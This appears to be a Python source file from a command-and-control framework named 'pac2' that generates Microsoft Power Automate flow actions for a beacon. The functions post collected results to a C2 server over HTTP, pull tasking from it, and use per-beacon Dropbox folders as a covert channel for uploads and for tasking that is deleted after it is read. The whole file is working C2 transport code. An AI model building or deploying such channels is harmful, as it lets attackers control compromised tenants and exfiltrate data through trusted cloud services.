from uuid import uuid4
from random import randint
from pypowerautomate.actions import Actions, ScopeStatement
from pypowerautomate.actions import HttpAction, SetVariableAction
from pypowerautomate.actions import DropboxGetFileContentAction
from pypowerautomate.actions import DropboxCreateFileAction,DropboxDeleteFileAction,DropboxUpdateFileAction

# C2 Connection Method Actions for HTTP(S)


def gen_http_post_request_action(action_name: str,
                                 client_id: str,
                                 url: str,
                                 body_action_name,
                                 task_id: str = None) -> Actions:
    """
    Upload Actions for HTTP mode
    args:
        - action_name: action_name
        - client_id: id of pac2 beacon
        - url: request url
        - body_action_name: action name to post.
    """
    actions = Actions()
    http_action = HttpAction(action_name, url, "POST")
    headers = {}
    headers["Pa-Client-Id"] = client_id
    if task_id:
        headers["Pa-Task-Id"] = task_id
    http_action.set_headers(headers)
    http_action.set_body(f"@body('{body_action_name}')")
    actions += http_action
    return actions


def gen_http_get_request_action(action_name: str,
                                client_id: str,
                                url: str,
                                payload_var) -> Actions:
    """
    Download Actions for HTTP mode
    args:
        - action_name: action_name
        - client_id: id of pac2 beacon
        - url: request url
        - payload_var: should be initial with InitVariableAction
    """
    actions = Actions()
    http_action = HttpAction(action_name, url, "GET")
    http_action.set_headers({"Pa-Client-Id": client_id})
    actions += http_action
    actions += SetVariableAction(f"set {payload_var}", payload_var, f"@{{body('{action_name}')}}")
    return actions


def gen_dropbox_upload_action(action_name: str,
                                client_id: str,
                                path: str,
                                body_action_name,
                                task_id: str = None) -> Actions:
    """
    Upload Actions for Dropbox mode
    args:
        - action_name: action_name
        - client_id: id of pac2 beacon
        - path: dropbox path
        - body_action_name: action name to post.
    """
    if not task_id:
        task_id = str(uuid4())
    actions = Actions()
    actions += DropboxCreateFileAction(action_name+"Create",
                                       f"pac2/{client_id}/upload",
                                       f"{task_id}-@{{rand(1,10000)}}.json",
                                       f"@body('{body_action_name}')")
    # dropbox_update_action = DropboxUpdateFileAction(action_name+"Update",
    #                                                 f"pac2/{client_id}/upload/{task_id}-{idx}.json",
    #                                                 f"@body('{body_action_name}')")
    # actions.append(dropbox_update_action,exec_if_failed=True)
    return actions


def gen_dropbox_download_action(action_name: str,
                                client_id: str,
                                path: str,
                                payload_var) -> Actions:
    """
    Download Actions for dropbox mode
    args:
        - action_name: action_name
        - client_id: id of pac2 beacon
        - path: dropbox path
        - payload_var: should be initial with InitVariableAction
    """
    actions = Actions()
    actions += DropboxGetFileContentAction(action_name+"Get", f"pac2/{client_id}/{path.lstrip('/')}")
    actions += DropboxDeleteFileAction(action_name+"Delete",f"pac2/{client_id}/{path.lstrip('/')}")
    actions += SetVariableAction(f"set {payload_var}", payload_var,f"@{{body('{action_name}Get')}}")

    return actions
